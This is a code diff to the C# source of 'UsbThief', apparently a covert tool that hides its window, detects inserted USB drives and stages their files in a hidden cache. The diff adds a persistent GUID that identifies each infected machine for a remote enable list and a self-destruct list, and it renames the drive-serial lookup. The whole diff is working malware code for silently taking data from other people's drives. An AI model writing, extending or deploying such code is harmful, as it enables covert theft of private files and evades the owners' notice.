@@ -21,11 +21,11 @@ namespace UsbThief
     {
         #region 声明变量
         public const bool dbg = false;//调试时改为true
-        public const int innerVer = 6;
+        public const int innerVer = 7;
         public bool enable = false;
         public bool fC2C = false;
         public bool inDelay = false;
-        public string machineName = Environment.MachineName;
+        public string gUID;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
         public const int WM_DEVICECHANGE = 0x219;//Notifies an application of a change to the hardware configuration of a device or the computer.
         public const int DBT_DEVICEARRIVAL = 0x8000;  //A device or piece of media has been inserted and is now available.
@@ -78,8 +78,31 @@ namespace UsbThief
             InitializeComponent();
             form.Show();
             form.Hide();
-            logger.Info("UsbThief已启动");
+            logger.Info("UsbThief正在初始化……");
             logger.Info("innerVer：" + innerVer);
+            try
+            {
+                if (!File.Exists(Application.StartupPath + "\\GUID"))
+                {
+                    FileStream fs1 = new FileStream(Application.StartupPath + "\\GUID", FileMode.Create, FileAccess.Write);
+                    StreamWriter sw = new StreamWriter(fs1);
+                    gUID = Guid.NewGuid().ToString();
+                    sw.WriteLine(gUID);
+                    sw.Close();
+                    fs1.Close();
+                }
+                else
+                {
+                    StreamReader sr = new StreamReader(Application.StartupPath + "\\GUID", Encoding.UTF8);
+                    gUID = /*new Guid(*/sr.ReadLine()/*).ToString()*/;
+                    sr.Close();
+                }
+            }
+            catch (Exception e)
+            {
+                logger.Error("读取或写入GUID异常：\n" + e);
+            }
+            logger.Info("GUID：" + gUID);
             mainThreadSyncContext = SynchronizationContext.Current;
             timer.Tick += Timer_Tick;
             timer.Start();
@@ -184,7 +207,7 @@ namespace UsbThief
             {
                 foreach (var item in conf.enabledList)
                 {
-                    if (item == machineName)
+                    if (item == gUID)
                     {
                         enable = true;
                         break;
@@ -197,7 +220,7 @@ namespace UsbThief
             {
                 foreach (var item in conf.suicideList)
                 {
-                    if (item == machineName)
+                    if (item == gUID)
                     {
                         try
                         {
@@ -299,7 +322,7 @@ namespace UsbThief
                                     {
                                         if (currentDevice.name == "none" && currentDevice.volLabel == "none" && currentDevice.ser == "none" && (sta != Status.exporting || sta != Status.compressing))
                                         {
-                                            string ser = GetUsbSer(drive.Name);
+                                            string ser = GetDriveSer(drive.Name);
                                             if (ser != null)
                                             {
                                                 if (conf.blacklist != null)
@@ -313,7 +336,7 @@ namespace UsbThief
                                                 }
                                                 currentDevice.name = drive.Name;
                                                 currentDevice.volLabel = drive.VolumeLabel;
-                                                currentDevice.ser = GetUsbSer(drive.Name);
+                                                currentDevice.ser = GetDriveSer(drive.Name);
                                                 newDevice = true;
                                                 logger.Info("USB设备“" + currentDevice.ser + "”已插入");
                                             }
@@ -612,7 +635,7 @@ namespace UsbThief
         }
         #endregion
         #region 获取Usb设备序列号
-        private string GetUsbSer(string driName)
+        private string GetDriveSer(string driName)
         {
             using (ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + driName.Replace("\\", "") + "\""))
             {
